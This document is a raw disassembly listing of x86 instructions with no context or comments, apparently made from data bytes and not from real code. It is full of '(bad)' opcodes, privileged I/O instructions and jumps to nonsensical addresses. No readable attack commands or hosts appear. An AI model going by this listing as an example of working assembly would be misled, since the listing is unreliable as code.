  425bb0:	in     al,0xbd
  425bb2:	or     ebx,DWORD PTR [ebp+0x20]
  425bb5:	mov    ebp,0x6ef6a879
  425bba:	mov    DWORD PTR [edi+0x6d],eax
  425bbd:	mov    bh,0x4a
  425bbf:	jmp    0x425b6f
  425bc1:	ins    BYTE PTR es:[edi],dx
  425bc2:	lods   eax,DWORD PTR ds:[esi]
  425bc3:	cmp    eax,0xeffc983c
  425bc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425bc9:	and    DWORD PTR ds:0xf57ad14f,0x67
  425bd0:	xchg   edi,eax
  425bd1:	sub    dh,bh
  425bd3:	out    dx,eax
  425bd4:	retf   
  425bd5:	xlat   BYTE PTR ds:[ebx]
  425bd6:	sub    ecx,DWORD PTR [eax+0x20]
  425bd9:	push   ecx
  425bda:	jp     0x425bd8
  425bdc:	in     eax,0x5e
  425bde:	add    DWORD PTR [esi-0x3],esp
  425be1:	std    
  425be2:	pop    esp
  425be3:	out    dx,al
  425be4:	sbb    ah,BYTE PTR [edi+ebx*4]
  425be7:	in     al,dx
  425be8:	mov    ds:0x8a3e9283,al
  425bed:	hlt    
  425bee:	fmul   QWORD PTR [edx+0x64]
  425bf1:	stos   DWORD PTR es:[edi],eax
  425bf2:	pushf  
  425bf3:	loope  0x425c6a
  425bf5:	adc    esi,eax
  425bf7:	push   esp
  425bf8:	repnz adc cl,ah
  425bfb:	sub    eax,0x899a77f0
  425c00:	mov    edi,0xcc2e1ea0
  425c05:	call   0x41de8565
  425c0a:	js     0x425c3a
  425c0c:	je     0x425c65
  425c0e:	inc    edi
  425c0f:	pop    DWORD PTR [edi+0x50]
  425c12:	jle    0x425c35
  425c14:	call   0xc438:0xa28a9129
  425c1b:	adc    al,0x8e
  425c1d:	add    eax,0x1995dcab
  425c22:	or     edi,DWORD PTR [edi+0x41]
  425c25:	mov    ah,0xc
  425c27:	dec    edx
  425c28:	dec    esp
  425c29:	lds    edx,FWORD PTR [edx-0x48]
  425c2c:	and    eax,0x20acd758
  425c31:	scas   al,BYTE PTR es:[edi]
  425c32:	add    al,0x2c
  425c34:	fcomp  QWORD PTR [ebx]
  425c36:	mov    ebp,0xa58d9223
  425c3b:	mov    ecx,0xed54214d
  425c40:	hlt    
  425c41:	fsub   st,st(2)
  425c43:	aas    
  425c44:	cli    
  425c45:	sub    al,ch
  425c47:	icebp  
  425c48:	sub    ebx,edx
  425c4a:	outs   dx,BYTE PTR ds:[esi]
  425c4b:	test   eax,0xbff5f802
  425c50:	(bad)  
  425c51:	fstp   QWORD PTR [ebp+0x3d]
  425c54:	test   eax,0x6214567f
  425c59:	xor    bl,BYTE PTR [edi+0x54]
  425c5c:	mov    ds:0x4260ea5b,eax
  425c61:	pusha  
  425c62:	xchg   ecx,eax
  425c63:	mov    edx,0x520f05c
  425c68:	scas   al,BYTE PTR es:[edi]
  425c69:	pop    ss
  425c6a:	repnz les ebx,FWORD PTR [edi-0x80]
  425c6e:	ins    DWORD PTR es:[edi],dx
  425c6f:	sahf   
  425c70:	and    BYTE PTR [ecx+0x576ce62b],dl
  425c76:	cs or  eax,0x5237f872
  425c7c:	add    bl,BYTE PTR [edx-0x40191cb]
  425c82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425c83:	pop    ss
  425c84:	jmp    0xad801fb8
  425c89:	bound  esp,QWORD PTR [edx+eax*4+0x28]
  425c8d:	mov    ds:0x53db7d15,al
  425c92:	add    eax,0x284b72cb
  425c97:	jne    0x425c41
  425c99:	cwde   
  425c9a:	dec    esi
  425c9b:	sub    eax,0x91e6917a
  425ca0:	sub    dh,BYTE PTR [ebp-0x7c]
  425ca3:	adc    al,0xa9
  425ca5:	push   cs
  425ca6:	add    eax,0xbb7687d9
  425cab:	daa    
  425cac:	outs   dx,BYTE PTR ds:[esi]
  425cad:	jne    0x425d1f
  425caf:	nop
  425cb0:	int3   
  425cb1:	mov    dl,0x27
  425cb3:	and    eax,0x2ebc89f5
  425cb8:	jge    0x425d26
  425cba:	cmp    edx,edx
  425cbc:	int3   
  425cbd:	std    
  425cbe:	out    dx,eax
  425cbf:	sbb    ah,BYTE PTR [edx+edx*1-0x70]
  425cc3:	and    eax,0x5da03441
  425cc8:	mov    al,ds:0xad884f9f
  425ccd:	shl    bh,cl
  425ccf:	xchg   ecx,eax
  425cd0:	js     0x425cea
  425cd2:	push   0xb37b220f
  425cd7:	xchg   esi,eax
  425cd8:	fld    QWORD PTR [ebx-0x1da6026a]
  425cde:	pusha  
  425cdf:	mov    edi,0x71d670e7
  425ce4:	fdiv   DWORD PTR [edi-0x3147c5a4]
  425cea:	das    
  425ceb:	ds std 
  425ced:	dec    ecx
  425cee:	(bad)  
  425cef:	daa    
  425cf0:	das    
  425cf1:	jecxz  0x425cd8
  425cf3:	jg     0x425ce6
  425cf5:	daa    
  425cf6:	dec    ecx
  425cf7:	mov    eax,ds:0x32e37365
  425cfc:	stos   BYTE PTR es:[edi],al
  425cfd:	mov    ebp,esi
  425cff:	cmc    
  425d00:	dec    ecx
  425d01:	popa   
  425d02:	in     al,0x53
  425d04:	int3   
  425d05:	mov    esi,0x8adab7b9
  425d0a:	les    ebp,FWORD PTR es:[ecx]
  425d0d:	inc    esi
  425d0e:	xchg   eax,edi
  425d10:	(bad)  
  425d11:	xor    BYTE PTR [ebx],bl
  425d13:	aaa    
  425d14:	and    DWORD PTR [esi],ebp
  425d16:	enter  0xb232,0xd8
  425d1a:	(bad)  
  425d1b:	and    edx,DWORD PTR [eax+0x3bc7e4f3]
  425d21:	add    BYTE PTR [eax],al
  425d23:	and    BYTE PTR [eax],al
  425d25:	dec    ecx
  425d26:	inc    esp
  425d27:	inc    ecx
  425d28:	push   esp
  425d29:	ret    
  425d2a:	jno    0x425d9d
  425d2c:	in     al,0x2
  425d2e:	mul    DWORD PTR fs:[ecx]
  425d31:	mov    ds:0x85dde86,eax
  425d36:	sbb    al,0xca
  425d38:	cmp    ecx,DWORD PTR [edi]
  425d3a:	nop
  425d3b:	push   edx
  425d3c:	and    al,BYTE PTR [ebx+0x757eca5f]
  425d42:	fxtract 
  425d44:	jecxz  0x425d83
  425d46:	fdivr  QWORD PTR [eax+0x4]
  425d49:	ss (bad) 
  425d4b:	mov    eax,ds:0x1dc291fe
  425d50:	or     cl,BYTE PTR [edi+0x54]
  425d53:	adc    BYTE PTR [eax-0xd3e475d],ah
  425d59:	push   cs
  425d5a:	out    dx,eax
  425d5b:	jg     0x425ced
  425d5d:	loopne 0x425d8b
  425d5f:	test   al,0xc
  425d61:	mul    ebx
  425d63:	dec    edx
  425d64:	mov    eax,ds:0x28acf658
  425d69:	jo     0x425cec
  425d6b:	sub    eax,0xc8418148
  425d70:	or     edi,DWORD PTR [esp+esi*8-0x2b6e7f44]
  425d77:	in     al,0x99
  425d79:	cwde   
  425d7a:	xchg   ecx,eax
  425d7b:	inc    edi
  425d7c:	stc    
  425d7d:	dec    esp
  425d7e:	repz jno 0x425ddb
  425d81:	sahf   
  425d82:	lds    edx,FWORD PTR [edi+ecx*4]
  425d85:	std    
  425d86:	inc    edi
  425d87:	inc    esp
  425d88:	xchg   ecx,eax
  425d89:	cmp    dl,BYTE PTR [eax+0x37]
  425d8c:	xor    eax,0x4008b6a1
  425d91:	dec    ecx
  425d92:	cmp    eax,0x45d8918e
  425d97:	jmp    0x425d82
  425d99:	sub    dl,al
  425d9b:	inc    dh
  425d9d:	fsubrp st(7),st
  425d9f:	aas    
  425da0:	stc    
  425da1:	sar    edi,0x7c
  425da4:	out    0x2b,eax
  425da6:	adc    cl,al
  425da8:	scas   eax,DWORD PTR es:[edi]
  425da9:	jp     0x425d66
  425dab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425dac:	or     al,BYTE PTR [eax]
  425dae:	loopne 0x425da8
  425db0:	retf   0x7f2
  425db3:	push   esp
  425db4:	xor    eax,0xc94267d1
  425db9:	sub    al,0x4a
  425dbb:	or     BYTE PTR [edx+0x78fd95d4],al
  425dc1:	jl     0x425d81
  425dc3:	mov    BYTE PTR [ebp+0x4e],dh
  425dc6:	push   cs
  425dc7:	sbb    bl,BYTE PTR [ebx+0x3a5e1d70]
  425dcd:	jle    0x425d5b
  425dcf:	add    al,0xf3
  425dd1:	xlat   BYTE PTR ds:[ebx]
  425dd2:	xor    al,0x1f
  425dd4:	nop
  425dd5:	daa    
  425dd6:	add    bl,BYTE PTR [edx+0x68]
  425dd9:	and    DWORD PTR [ecx],0x76906829
  425ddf:	sub    DWORD PTR [edi+0x4788fb3f],ebp
  425de5:	jg     0x425e59
  425de7:	mov    bl,0x91
  425de9:	xor    al,0xb3
  425deb:	repz and al,0x3f
  425dee:	addr16 hlt 
  425df0:	cs scas eax,DWORD PTR es:[edi]
  425df2:	mov    ecx,0xfbafae55
  425df7:	inc    ecx
  425df8:	adc    ebp,DWORD PTR [ebx]
  425dfa:	ret    0xa441
  425dfd:	fucomip st,st(0)
  425dff:	mov    DWORD PTR [edi-0x74],edx
  425e02:	fmul   QWORD PTR [ebx-0x2f]
  425e05:	xchg   ebx,eax
  425e06:	push   ebp
  425e07:	adc    BYTE PTR [ebx-0x12f60887],cl
  425e0d:	and    dh,al
  425e0f:	dec    eax
  425e10:	ror    dl,1
  425e12:	jp     0x425e27
  425e14:	sub    ecx,DWORD PTR cs:[edx+eax*1-0x66]
  425e19:	add    bl,BYTE PTR [edx]
  425e1b:	add    ecx,DWORD PTR [ecx+0x549e9a0e]
  425e21:	jne    0x425dc7
  425e23:	xor    DWORD PTR ds:[ebx+0x23],ebp
  425e27:	ins    DWORD PTR es:[edi],dx
  425e28:	pop    ss
  425e29:	jmp    0x3a90e719
  425e2e:	cwde   
  425e2f:	sub    BYTE PTR [edx],dh
  425e31:	push   ebp
  425e32:	and    DWORD PTR fs:[ecx],edx
  425e35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425e36:	xchg   ecx,eax
  425e37:	dec    esi
  425e38:	pop    edx
  425e39:	dec    ch
  425e3b:	xchg   ebx,eax
  425e3c:	lahf   
  425e3d:	loopne 0x425dcd
  425e3f:	cmc    
  425e40:	xlat   BYTE PTR ds:[ebx]
  425e41:	jo     0x425e35
  425e43:	iret   
  425e44:	jmp    DWORD PTR [ebx+0x62]
  425e47:	fbstp  TBYTE PTR [ecx-0x17]
  425e4a:	jmp    0x9f35d29a
  425e4f:	aad    0x13
  425e51:	push   ebx
  425e52:	push   ss
  425e53:	push   ss
  425e54:	add    cl,BYTE PTR [ebx-0x7a3a7e75]
  425e5a:	mov    ch,BYTE PTR [ecx+0x53]
  425e5d:	push   ebx
  425e5e:	aaa    
  425e5f:	inc    edx
  425e60:	rcr    DWORD PTR [eax-0x71],cl
  425e63:	(bad)  
  425e64:	pushf  
  425e65:	and    DWORD PTR [ebx+0x3efc5105],edx
  425e6b:	jno    0x425e55
  425e6d:	outs   dx,BYTE PTR ds:[esi]
  425e6e:	test   BYTE PTR cs:[edi-0x15],dh
  425e72:	shl    DWORD PTR [ecx+0x77],1
  425e75:	sahf   
  425e76:	in     al,dx
  425e77:	stos   DWORD PTR es:[edi],eax
  425e78:	sti    
  425e79:	cmp    bh,dh
  425e7b:	cdq    
  425e7c:	cmp    al,0x1c
  425e7e:	pop    edx
  425e7f:	jns    0x425eec
  425e81:	out    dx,al
  425e82:	ficomp DWORD PTR [ebx+0x38]
  425e85:	push   ss
  425e86:	sbb    eax,0x18570329
  425e8b:	cmp    dh,BYTE PTR [eax+0x10]
  425e8e:	adc    eax,0x9660d356
  425e93:	pop    ecx
  425e94:	xchg   DWORD PTR [edi+0x17153591],ebx
  425e9a:	into   
  425e9b:	pushf  
  425e9c:	enter  0xe4a3,0xb8
  425ea0:	(bad)  
  425ea1:	pusha  
  425ea2:	icebp  
  425ea3:	cmc    
  425ea4:	mov    BYTE PTR [edx-0x41f6c8b8],ah
  425eaa:	push   cs
  425eab:	push   esi
  425eac:	jg     0x425e32
  425eae:	or     BYTE PTR [edx-0x62],al
  425eb1:	outs   dx,BYTE PTR ds:[esi]
  425eb2:	jb     0x425ea8
  425eb4:	js     0x425efb
  425eb6:	xchg   ecx,eax
  425eb7:	push   0x10
  425eb9:	hlt    
  425eba:	(bad)  
  425ebb:	jmp    0x9bd730f3
  425ec0:	mov    ds:0x56b09e24,al
  425ec5:	mov    esp,0xe72e2d6
  425eca:	retf   0x8060
  425ecd:	mov    bh,0x5a
  425ecf:	out    0x78,al
  425ed1:	or     BYTE PTR [eax],ah
  425ed3:	mov    ch,0x12
  425ed5:	push   0x2b
  425ed7:	xchg   edi,eax
  425ed8:	pcmpeqw mm4,QWORD PTR [eax-0x131cb62]
  425edf:	(bad)  
  425ee0:	repnz push ds
  425ee2:	xor    dh,BYTE PTR [ecx]
  425ee4:	or     ch,BYTE PTR [edx-0xfc1555f]
  425eea:	loop   0x425f11
  425eec:	repz stc 
  425eee:	mov    bh,0x5b
  425ef0:	stos   BYTE PTR es:[edi],al
  425ef1:	add    BYTE PTR [esi],dh
  425ef3:	ss ss hlt 
  425ef6:	sahf   
  425ef7:	aas    
  425ef8:	dec    DWORD PTR [esi+0x7ebaebc7]
  425efe:	adc    al,0xd1
  425f00:	movlps QWORD PTR fs:0x27decbe,xmm5
  425f08:	jmp    0x425ee4
  425f0a:	cmp    ebx,DWORD PTR [esi+0x71939054]
  425f10:	ins    BYTE PTR es:[edi],dx
  425f11:	push   ebx
  425f12:	xchg   al,bh
  425f14:	test   BYTE PTR ds:[edx-0x19],ah
  425f18:	sub    DWORD PTR [eax-0x3e23a056],edx
  425f1e:	call   0xe01c:0x3fc20fe0
  425f25:	(bad)  
  425f26:	and    al,0x7
  425f28:	mov    cl,0xf3
  425f2a:	add    al,0xca
  425f2c:	inc    edx
  425f2d:	scas   al,BYTE PTR es:[edi]
  425f2e:	adc    al,0xb
  425f30:	push   ecx
  425f31:	call   0xa2a0:0x11df1466
  425f38:	lahf   
  425f39:	jne    0x425f6f
  425f3b:	jne    0x425f9a
  425f3d:	es jb  0x425eef
  425f40:	sub    eax,0xe692db7d
  425f45:	add    dh,bl
  425f47:	ins    BYTE PTR es:[edi],dx
  425f48:	adc    al,0x95
  425f4a:	stc    
  425f4b:	jl     0x425f1b
  425f4d:	jl     0x425f0e
  425f4f:	daa    
  425f50:	push   ds
  425f51:	sub    ch,BYTE PTR [ecx-0x753e78ed]
  425f57:	jbe    0x425f6a
  425f59:	mov    ch,0xc5
  425f5b:	fisttp WORD PTR [ecx]
  425f5d:	or     cl,BYTE PTR [ecx+0x480d309e]
  425f63:	and    ecx,DWORD PTR [eax+0x12]
  425f66:	ret    0x362
  425f69:	or     esp,DWORD PTR [edx-0x3e]
  425f6c:	xor    DWORD PTR [ebx+0x17965a88],ecx
  425f72:	and    BYTE PTR [esi],0x21
  425f75:	into   
  425f76:	push   0xffffffda
  425f78:	fs mov esp,0x96c41546
  425f7e:	daa    
  425f7f:	outs   dx,DWORD PTR ds:[esi]
  425f80:	test   BYTE PTR [edx+0x49],ch
  425f83:	pusha  
  425f84:	sub    DWORD PTR [ecx-0x21433716],edx
  425f8a:	out    0x23,eax
  425f8c:	iret   
  425f8d:	jl     0x425f1b
  425f8f:	xlat   BYTE PTR ds:[ebx]
  425f90:	fidivr WORD PTR [ecx+0x3f]
  425f93:	repnz push edi
  425f95:	(bad)  
  425f96:	addr16 je 0x425ffa
  425f99:	(bad)  
  425f9a:	sub    edx,DWORD PTR [edi]
  425f9c:	scas   eax,DWORD PTR es:[edi]
  425f9d:	mov    al,0x7f
  425f9f:	arpl   WORD PTR [edi],cx
  425fa1:	in     eax,dx
  425fa2:	cmp    esi,DWORD PTR [edi+ebp*8+0x264c8911]
  425fa9:	retf   0x82c2
  425fac:	mov    al,0xb4
  425fae:	pop    esp
  425faf:	jae    0x426013
  425fb1:	jne    0x425f7d
  425fb3:	loop   0x426017
  425fb5:	vrsqrtss xmm1,xmm3,xmm5
  425fb9:	je     0x426025
  425fbb:	lea    ebx,[ecx+0x32]
  425fbe:	jmp    0xb37935a
  425fc3:	je     0x42601c
  425fc5:	xchg   dh,dl
  425fc7:	fmul   st(1),st
  425fc9:	std    
  425fca:	jno    0x425f53
  425fcc:	out    dx,eax
  425fcd:	cmp    DWORD PTR [ebx+ebx*2-0x43673d6c],edi
  425fd4:	jae    0x425f97
  425fd6:	sub    al,0x99
  425fd8:	xchg   dh,cl
  425fda:	inc    ebx
  425fdb:	enter  0xfc68,0x2d
  425fdf:	loope  0x425fce
  425fe1:	imul   ebx,DWORD PTR es:[edi-0x22],0xffffffef
  425fe6:	mov    al,0x2f
  425fe8:	ret    
  425fe9:	jge    0x425fe7
  425feb:	clc    
  425fec:	and    BYTE PTR [edx-0x1b],cl
  425fef:	scas   al,BYTE PTR es:[edi]
  425ff0:	fwait
  425ff1:	lods   eax,DWORD PTR ds:[esi]
  425ff2:	cmp    eax,0x39cbbf1
  425ff7:	mov    ah,al
  425ff9:	fcmovnb st,st(7)
  425ffb:	stc    
  425ffc:	mov    bl,0x44
  425ffe:	mov    cl,0xc0
  426000:	out    dx,al
  426001:	inc    edx
  426002:	push   0xf17ae018
  426007:	xor    al,0x60
  426009:	and    al,0xb8
  42600b:	arpl   WORD PTR [ebp-0x20],sp
  42600e:	or     dl,bl
  426010:	mov    ds:0x8e7f0557,eax
  426015:	stos   BYTE PTR es:[edi],al
  426016:	fdiv   DWORD PTR ds:0x1a589693
  42601c:	jbe    0x426047
  42601e:	push   ecx
  42601f:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426021:	mov    dh,0xc1
  426023:	jne    0x426026
  426025:	adc    DWORD PTR [edi-0x3],esp
  426028:	fwait
  426029:	mov    ch,BYTE PTR [edx-0x7ad05257]
  42602f:	dec    edi
  426030:	lds    edx,FWORD PTR [ebx+edx*4]
  426033:	jne    0x4260a2
  426035:	push   esi
  426036:	stos   DWORD PTR es:[edi],eax
  426037:	adc    ch,BYTE PTR [ebp+0x1fdec9eb]
  42603d:	dec    eax
  42603f:	(bad)  
  426041:	mov    edi,0x7ba1577e
  426046:	xchg   ecx,eax
  426047:	fld    TBYTE PTR ds:0xdbca044b
  42604d:	iret   
  42604e:	(bad)  
  42604f:	aad    0x3f
  426051:	adc    al,0xef
  426053:	std    
  426054:	rol    BYTE PTR [edi-0x3a299b81],0x7f
  42605b:	and    BYTE PTR [ecx+0x49],cl
  42605e:	pop    ebp
  42605f:	and    BYTE PTR [esi+0x1084c247],0x2a
  426066:	mov    ah,0x52
  426068:	stos   BYTE PTR es:[edi],al
  426069:	dec    ecx
  42606a:	test   BYTE PTR [ecx],bh
  42606c:	and    al,0x6b
  42606e:	(bad)  
  42606f:	data16 adc al,0xc9
  426072:	dec    eax
  426073:	fiadd  DWORD PTR [ebx]
  426075:	bound  esi,QWORD PTR [ebx-0x5e75202f]
  42607b:	jnp    0x42601e
  42607d:	ficomp DWORD PTR [edi-0x5a]
  426080:	scas   eax,DWORD PTR es:[edi]
  426081:	imul   BYTE PTR [eax+0x58]
  426084:	daa    
  426085:	sub    eax,DWORD PTR [ecx]
  426087:	fucomi st,st(4)
  426089:	outs   dx,DWORD PTR ds:[esi]
  42608a:	sbb    eax,0xfa0c9cbd
  42608f:	dec    edx
  426090:	sti    
  426091:	xchg   ecx,eax
  426092:	pop    esp
  426093:	dec    ebx
  426094:	stos   DWORD PTR es:[edi],eax
  426095:	stc    
  426096:	jae    0x426040
  426098:	stos   BYTE PTR es:[edi],al
  426099:	inc    eax
  42609a:	pop    ebp
  42609b:	mov    ebx,0x343da98f
  4260a0:	out    dx,al
  4260a1:	inc    ebx
  4260a2:	addr16 lahf 
  4260a4:	push   ecx
  4260a5:	xchg   esp,eax
  4260a6:	jbe    0x426056
  4260a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4260a9:	sbb    DWORD PTR [edx-0x70e966b0],0xffffffb3
  4260b0:	inc    esp
  4260b1:	xlat   BYTE PTR ds:[ebx]
  4260b2:	inc    ebp
  4260b3:	pop    ebx
  4260b4:	in     eax,0x31
  4260b6:	cmp    DWORD PTR [edx],edi
  4260b8:	adc    BYTE PTR [ecx],dh
  4260ba:	push   ebp
  4260bb:	sbb    bl,BYTE PTR ds:0xf34827de
  4260c1:	push   cs
  4260c2:	jmp    0x841:0xd4e6988e
  4260c9:	sub    DWORD PTR [eax-0x76a6f69a],edx
  4260cf:	and    al,0xad
  4260d1:	nop
  4260d2:	jge    0x426124
  4260d4:	sub    dh,BYTE PTR [esi+eiz*2-0x36]
  4260d8:	dec    ebx
  4260d9:	push   edi
  4260da:	and    ch,BYTE PTR [ecx]
  4260dc:	call   0x6c80:0xab3bebda
  4260e3:	sbb    ah,BYTE PTR [ecx]
  4260e5:	dec    esp
  4260e6:	lods   al,BYTE PTR ds:[esi]
  4260e7:	ins    DWORD PTR es:[edi],dx
  4260e8:	pop    ecx
  4260e9:	push   ebp
  4260ea:	push   ebp
  4260eb:	les    ebp,FWORD PTR [edx]
  4260ed:	ror    dh,cl
  4260ef:	xchg   ebp,eax
  4260f0:	sub    esi,DWORD PTR [ebx-0x7a250395]
  4260f6:	(bad)  
  4260f7:	icebp  
  4260f8:	in     eax,dx
  4260f9:	scas   eax,DWORD PTR es:[edi]
  4260fa:	clc    
  4260fb:	and    edi,DWORD PTR [esp+edi*8+0x7b]
  4260ff:	jle    0x42609d
  426101:	sub    ebx,DWORD PTR [edi]
  426103:	jle    0x426110
  426105:	xlat   BYTE PTR ds:[ebx]
  426106:	test   eax,0xcef50a20
  42610b:	sub    ah,BYTE PTR [ecx-0x7eab71c3]
  426111:	mov    ah,0xbb
  426113:	test   dh,cl
  426115:	daa    
  426116:	lods   al,BYTE PTR ds:[esi]
  426117:	cs scas eax,DWORD PTR es:[edi]
  426119:	(bad)  [edx+ebp*4+0x2a]
  42611d:	push   ss
  42611e:	(bad)  
  42611f:	xor    eax,0x6bcd8108
  426124:	mov    bl,0x41
  426126:	pop    eax
  426127:	sar    ebp,0xe6
  42612a:	xor    dh,BYTE PTR [eiz*2-0x489a788c]
  426131:	mov    ch,0x1c
  426133:	jbe    0x4260f9
  426135:	push   ss
  426136:	data16 xlat BYTE PTR ds:[ebx]
  426138:	retf   
  426139:	xor    ecx,DWORD PTR [edx]
  42613b:	cmp    eax,0xaa045fa4
  426140:	xor    al,0x8
  426142:	sub    eax,0x7f10cddb
  426147:	fcomp  DWORD PTR [edi-0x3f5347f7]
  42614d:	dec    ebx
  42614e:	and    ebx,esi
  426150:	sub    dh,bh
  426152:	pop    edi
  426153:	push   esp
  426154:	jle    0x42610c
  426156:	fadd   QWORD PTR ds:0x6fd765f1
  42615c:	push   esp
  42615d:	jecxz  0x426186
  42615f:	inc    ebx
  426160:	sbb    BYTE PTR [ecx+0x19],dl
  426163:	mov    ds,WORD PTR [ebx]
  426165:	xchg   esp,eax
  426166:	int    0x78
  426168:	fimul  DWORD PTR [ebp+0x1c7f870d]
  42616e:	bnd jae 0x4261e2
  426171:	adc    esi,DWORD PTR [ecx+0x1d341988]
  426177:	mov    ch,0xe6
  426179:	das    
  42617a:	adc    BYTE PTR [ebx+0x6f],0xda
  42617e:	xchg   edi,eax
  42617f:	lea    edx,[edx-0x17948ad7]
  426185:	or     dl,BYTE PTR [edx+0x59]
  426188:	(bad)  
  426189:	fistp  QWORD PTR [edx-0x4ed55757]
  42618f:	call   0xa17c1124
  426194:	dec    esi
  426195:	sahf   
  426196:	or     eax,edx
  426198:	fisub  WORD PTR [ebp+0x25e25f9d]
  42619e:	fsubr  QWORD PTR [esi-0x47]
  4261a1:	add    bl,al
  4261a3:	fcomp  st(0)
  4261a5:	rcr    bl,1
  4261a7:	into   
  4261a8:	popf   
  4261a9:	clc    
  4261aa:	test   eax,0xfabe9fa7
  4261af:	inc    ebx
  4261b0:	sub    ecx,ebp
  4261b2:	mov    ds:0x57b124c4,al
  4261b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4261b8:	dec    edx
  4261b9:	test   BYTE PTR [esi],ah
  4261bb:	inc    eax
  4261bc:	stos   BYTE PTR es:[edi],al
  4261bd:	rcl    BYTE PTR [ebx+edx*1-0x45],1
  4261c1:	into   
  4261c2:	stos   DWORD PTR es:[edi],eax
  4261c3:	sahf   
  4261c4:	lods   al,BYTE PTR ds:[esi]
  4261c5:	pop    ecx
  4261c6:	dec    eax
  4261c7:	enter  0xe59d,0x5c
  4261cb:	inc    esi
  4261cc:	jae    0x4261b1
  4261ce:	mov    ecx,fs
  4261d0:	pop    ebp
  4261d1:	sub    DWORD PTR [eax+0x4d],ecx
  4261d4:	popf   
  4261d5:	(bad)  
  4261d6:	xchg   BYTE PTR [ebx+0x196ddc95],cl
  4261dc:	mov    ebp,0x9b139e49
  4261e1:	push   ebp
  4261e2:	imul   edi
  4261e4:	mov    bh,0x55
  4261e7:	xchg   ebp,eax
  4261e8:	lods   eax,DWORD PTR ds:[esi]
  4261e9:	out    0xb6,eax
  4261eb:	jb     0x42618f
  4261ed:	mov    eax,ds:0x88943b6b
  4261f2:	pushf  
  4261f3:	in     al,dx
  4261f4:	cdq    
  4261f5:	imul   ecx,DWORD PTR [edi-0x23],0xec4a5680
  4261fc:	adc    al,0x9d
  4261fe:	dec    edi
  4261ff:	sub    al,0xfe
  426201:	cmp    eax,0x9e7b0e75
  426206:	mov    al,ds:0xb1d6c813
  42620b:	div    BYTE PTR [ebx-0x3a]
  42620e:	in     al,0xfd
  426210:	add    esi,DWORD PTR [ebx]
  426212:	mov    ah,0x34
  426214:	imul   edx,ecx,0xffffffa7
  426217:	enter  0xb164,0xa7
  42621b:	xchg   edx,eax
  42621c:	mov    bh,BYTE PTR [esi+0x2f]
  42621f:	rol    DWORD PTR [ecx],0xa4
  426222:	mov    dh,0x23
  426224:	push   esp
  426225:	adc    eax,0x61757a31
  42622a:	test   ebx,edi
  42622c:	push   ss
  42622d:	(bad)  
  42622e:	cmp    al,0xa5
  426230:	dec    ebx
  426231:	adc    ebp,ebp
  426233:	sub    dl,BYTE PTR [edx+0x4a]
  426236:	dec    esp
  426237:	adc    DWORD PTR [eax+0x4f],0x3
  42623b:	push   ebx
  42623c:	test   BYTE PTR [esi],ch
  42623e:	or     BYTE PTR [ebp-0x28fcabbc],bl
  426244:	out    0x3b,eax
  426246:	cld    
  426247:	mov    bl,0x87
  426249:	(bad)  
  42624a:	adc    eax,0x97b99ff7
  42624f:	aaa    
  426250:	jl     0x4262c9
  426252:	fs test eax,0xd812229e
  426258:	out    dx,eax
  426259:	scas   eax,DWORD PTR es:[edi]
  42625a:	mov    cl,0xdf
  42625c:	aas    
  42625d:	(bad)  
  42625e:	les    ecx,FWORD PTR [esi+0x2e35edcb]
  426264:	jg     0x426256
  426266:	int    0x6c
  426268:	mov    cl,0x4b
  42626a:	jae    0x426251
  42626c:	cs cli 
  42626e:	or     esp,DWORD PTR [edi-0x158cab70]
  426274:	fcomp  QWORD PTR [ecx]
  426276:	(bad)  
  426277:	dec    esi
  426278:	dec    esi
  426279:	fcomp  st(4)
  42627b:	cwde   
  42627c:	xor    DWORD PTR [eax-0x635e7113],esi
  426282:	sub    al,0x2d
  426284:	imul   BYTE PTR [edx-0x317332d8]
  42628a:	in     al,dx
  42628b:	clc    
  42628c:	and    ah,BYTE PTR [esi+0x23]
  42628f:	mov    ecx,0xe2acc110
  426294:	sub    BYTE PTR [ebp+0x78],dh
  426297:	sub    al,0x6c
  426299:	ret    
  42629a:	or     ecx,ebp
  42629c:	sti    
  42629d:	mov    ah,0xbc
  42629f:	scas   eax,DWORD PTR es:[edi]
  4262a0:	rcr    ebx,1
  4262a2:	jecxz  0x4262cc
  4262a4:	dec    ecx
  4262a5:	retf   
  4262a6:	pusha  
  4262a7:	(bad)  
  4262a8:	repz mov esi,0x3706aca2
  4262ae:	and    bl,BYTE PTR [edi+0x6bd8e537]
  4262b4:	mov    dh,0xda
  4262b6:	dec    edx
  4262b7:	imul   ecx,ecx,0x3817ce3d
  4262bd:	mov    ds:0x18cbb27f,al
  4262c2:	mov    dl,0xda
  4262c4:	mov    bl,0xe7
  4262c6:	xor    al,0x1e
  4262c8:	push   edi
  4262c9:	dec    ebx
  4262ca:	aaa    
  4262cb:	stos   DWORD PTR es:[edi],eax
  4262cc:	mov    dl,0xec
  4262ce:	mov    ebp,0x2962895d
  4262d3:	dec    edx
  4262d4:	lods   al,BYTE PTR ds:[esi]
  4262d5:	cs iret 
  4262d7:	xor    DWORD PTR ds:0x4711ba2,edi
  4262dd:	mov    al,ds:0x1baa6788
  4262e2:	hlt    
  4262e3:	cmovge ecx,DWORD PTR [ebp+0x55]
  4262e7:	pop    ebx
  4262e8:	scas   al,BYTE PTR es:[edi]
  4262e9:	mov    DWORD PTR [edx+0x19],edi
  4262ec:	jne    0x426278
  4262ee:	cmp    edx,esi
  4262f0:	mov    esp,db0
  4262f3:	pop    eax
  4262f4:	dec    ebp
  4262f5:	stos   BYTE PTR es:[edi],al
  4262f6:	mov    edi,0xff8452f7
  4262fb:	bnd jbe 0x426349
  4262fe:	push   0x1
  426300:	outs   dx,BYTE PTR ds:[esi]
  426301:	fisubr WORD PTR [esi-0x45]
  426304:	in     eax,dx
  426305:	ss jns 0x426301
  426308:	jmp    0x426308
  42630a:	(bad)  
  42630b:	mov    edi,0x78fe9a8c
  426310:	cwde   
  426311:	aam    0xa1
  426313:	cdq    
  426314:	xor    al,0xd4
  426316:	mov    ecx,DWORD PTR ds:0x290264d5
  42631c:	ror    ebp,1
  42631e:	cmp    edi,edx
  426320:	mov    dh,0x23
  426322:	int    0x3d
  426324:	and    al,0xa5
  426326:	stc    
  426327:	sbb    eax,0xe54c8148
  42632c:	ja     0x42639f
  42632e:	pushf  
